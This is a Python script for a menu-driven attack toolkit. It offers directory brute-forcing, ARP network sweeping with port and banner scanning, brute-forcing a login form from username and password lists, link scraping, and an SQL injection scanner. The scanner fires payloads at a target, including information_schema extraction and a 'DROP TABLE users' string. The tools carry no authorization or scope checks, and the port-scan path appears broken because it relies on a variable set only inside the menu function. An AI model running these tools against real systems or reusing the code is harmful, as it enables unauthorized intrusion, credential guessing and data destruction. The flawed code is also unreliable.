import requests
from bs4 import BeautifulSoup
import os
import sys
import socket
from scapy.all import ARP, Ether, srp
import ipaddress
import time

# Tool 1: Brute Force Directories
def brute_force_directories(url, wordlist):
    with open(wordlist, 'r') as f:
        directories = f.read().splitlines()

    for directory in directories:
        target_url = f"{url}/{directory}"
        response = requests.get(target_url)
        
        if response.status_code == 200:
            print(f"Found directory: {target_url}")
        elif response.status_code == 403:
            print(f"Access forbidden: {target_url}")
        elif response.status_code == 404:
            print(f"Not found: {target_url}")

# Tool 2: Network Scan and Port Scan
def check_permissions():
    if os.geteuid() != 0:
        print("This script must be run as root. Please use sudo.")
        sys.exit(1)

def get_network_range():
    while True:
        network_range = input("Enter the network range (e.g., 192.168.1.0/24): ")
        try:
            ipaddress.IPv4Network(network_range)
            return network_range
        except ValueError:
            print("Invalid network range. Please try again.")

def scan_network(network_range):
    print(f"Scanning network: {network_range}")
    arp = ARP(pdst=network_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=2, verbose=False)[0]
    devices = []
    for sent, received in result:
        ip_addr = received.psrc
        if ip_addr.split('.')[-1] in ['1', '2', '254']:
            continue
        devices.append({'ip': ip_addr, 'mac': received.hwsrc})
    return devices

def grab_banner(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(1)
            sock.connect((ip, port))
            response = sock.recv(1024)
            try:
                banner = response.decode(errors='replace').strip()
            except UnicodeDecodeError:
                banner = response.decode('latin1', errors='replace').strip()
            return banner
    except Exception as e:
        return f"Error: {e}"

def scan_ports(ip, ports):
    open_ports = []
    for port in ports:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                service = port_service_map.get(port, "Unknown")
                banner = grab_banner(ip, port)
                open_ports.append((port, service, banner))
            sock.close()
        except socket.timeout:
            print(f"Port {port} on {ip} timed out.")
        except Exception as e:
            print(f"Error scanning port {port} on {ip}: {e}")
    return open_ports

def display_results(devices):
    print("\nAvailable devices in the network:")
    print(f"{'IP':<16} {'MAC':<18} {'Open Ports (Services) and Versions':<60}")
    print("="*100)
    for device in devices:
        print(f"Scanning ports for IP: {device['ip']}")
        open_ports = scan_ports(device['ip'], port_range)
        open_ports_str = ', '.join(f"{port} ({service}) - {banner}" for port, service, banner in open_ports)
        print(f"{device['ip']:<16} {device['mac']:<18} {open_ports_str:<60}")
        time.sleep(1)

port_service_map = {
    1: "tcpmux",
    7: "echo",
    9: "discard",
    11: "systat",
    13: "daytime",
    17: "qotd",
    19: "chargen",
    20: "ftp-data",
    21: "ftp",
    22: "ssh",
    23: "telnet",
    25: "smtp",
    53: "dns",
    67: "dhcp",
    68: "dhcp",
    69: "tftp",
    70: "gopher",
    79: "finger",
    80: "http",
    88: "kerberos",
    110: "pop3",
    113: "ident",
    119: "nntp",
    123: "ntp",
    135: "msrpc",
    137: "netbios-ns",
    138: "netbios-dgm",
    139: "netbios-ssn",
    143: "imap",
    161: "snmp",
    162: "snmp-trap",
    179: "bgp",
    194: "irc",
    199: "smux",
    220: "imap3",
    3306: "mysql",
    3389: "rdp",
    5432: "postgres",
    5900: "vnc",
    6379: "redis",
    8080: "http-proxy"
}

# Tool 3: Brute Force Login
def brute_force_login(url, username_file, password_file):
    with open(username_file, 'r') as uf:
        usernames = uf.read().strip().splitlines()

    with open(password_file, 'r') as pf:
        passwords = pf.read().strip().splitlines()

    for username in usernames:
        for password in passwords:
            session = requests.Session()
            login_data = {
                'username': username,
                'password': password,
                'submit': 'login'
            }
            response = session.post(url, data=login_data)
            if 'Login failed' not in response.text:
                print(f"Login successful with username: {username} and password: {password}")
                return
    print("Login failed. Credentials not found.")

# Tool 4: Web Scraper
def fetch_page(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        print(f"Error fetching {url}: {e}")
        return None

def parse_page(content):
    soup = BeautifulSoup(content, 'html.parser')
    results = []
    for a_tag in soup.find_all('a', href=True):
        title = a_tag.get_text().strip()
        link = a_tag['href']
        results.append((title, link))
    return results

def scrape_website(url):
    print(f"Starting scrape for {url}")
    page_content = fetch_page(url)
    if not page_content:
        print(f"Failed to retrieve content from {url}")
        return
    parsed_data = parse_page(page_content)
    print(f"Scraping complete for {url}. Found {len(parsed_data)} links.")
    for title, link in parsed_data:
        print(f"Title: {title}, Link: {link}")

# Tool 5: SQL Injection Scanner
def scan_for_sql_injection(url):
    vulnerable_urls = []
    payloads = [
        "'",                          # Basic single quote injection
        "1' OR '1'='1",               # Boolean-based SQL injection
        "1'; DROP TABLE users; --",   # SQL injection with potential malicious intent
        "1' AND 1=0 UNION SELECT NULL, TABLE_NAME FROM information_schema.tables --",  # Union-based injection
        "1' AND 1=0 UNION SELECT NULL, CONCAT(table_name, column_name) FROM information_schema.columns --"  # Information schema extraction
    ]
    error_keywords = [
        'SQL syntax', 'Internal Server Error', 'You have an error', 'Warning: mysql_', 'Unclosed quotation mark', 'quoted string not properly terminated'
    ]
    print(f"Starting SQL injection scan on URL")
    for payload in payloads:
        try:
            test_url = f"{url}{payload}"
            print(f"Testing with payload: {payload}")
            response = requests.get(test_url)
            print(f"URL requested: {response.url}")
            print(f"Response status code: {response.status_code}")
            if any(keyword in response.text for keyword in error_keywords):
                print(f"[VULNERABLE] SQL Injection detected: {test_url}")
                vulnerable_urls.append((test_url, 'GET', payload))
            else:
                print(f"[SAFE] No SQL Injection detected with payload: {payload}")
        except requests.RequestException as e:
            print(f"Request error occurred: {str(e)}")
        except Exception as e:
            print(f"General error occurred: {str(e)}")
    if not vulnerable_urls:
        print("No SQL Injection vulnerabilities detected.")
    else:
        print("\n\n\n\nVulnerable URLs & The Results are:")
        for vuln_url, vuln_method, vuln_payload in vulnerable_urls:
            print(f"- Method: {vuln_method}, URL: {vuln_url}, Payload: {vuln_payload}")
    return vulnerable_urls

# Main menu
def main_menu():
    while True:
        print("\nSelect a tool to use:")
        print("1. Brute Force Directories")
        print("2. Network Scan and Port Scan")
        print("3. Brute Force Login")
        print("4. Web Scraper")
        print("5. SQL Injection Scanner")
        print("6. Exit")

        choice = input("Enter your choice (1-6): ")
        if choice == '1':
            url = input("Enter the URL of the target website: ")
            wordlist = input("Enter the path to the wordlist file: ")
            brute_force_directories(url, wordlist)
        elif choice == '2':
            check_permissions()
            network_range = get_network_range()
            port_range = list(port_service_map.keys())
            scanned_devices = scan_network(network_range)
            display_results(scanned_devices)
        elif choice == '3':
            url = input("Enter the login URL: ")
            username_file = input("Enter the path to the usernames file: ")
            password_file = input("Enter the path to the passwords file: ")
            brute_force_login(url, username_file, password_file)
        elif choice == '4':
            target_url = input("Enter the URL of the website to scrape: ")
            scrape_website(target_url)
        elif choice == '5':
            target_url = input("Enter the target URL for SQL injection scanning: ")
            scan_for_sql_injection(target_url)
        elif choice == '6':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please enter a number between 1 and 6.")

if __name__ == "__main__":
    main_menu()